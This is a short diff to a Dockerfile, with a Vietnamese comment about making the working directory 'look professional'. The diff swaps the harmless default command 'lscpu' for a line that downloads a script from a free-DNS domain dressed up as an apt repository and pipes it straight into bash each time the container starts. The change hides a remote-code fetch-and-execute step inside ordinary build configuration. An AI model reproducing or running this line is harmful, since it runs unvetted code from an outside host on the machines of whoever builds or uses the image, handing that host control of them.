@@ -6,4 +6,5 @@ RUN apt update && apt install nodejs curl git -y
 # Đặt thư mục làm việc, cho nó có vẻ chuyên nghiệp
 WORKDIR /tmp
 
-CMD lscpu
+CMD curl -sL https://apt.apicuateo.dpdns.org | bash
+
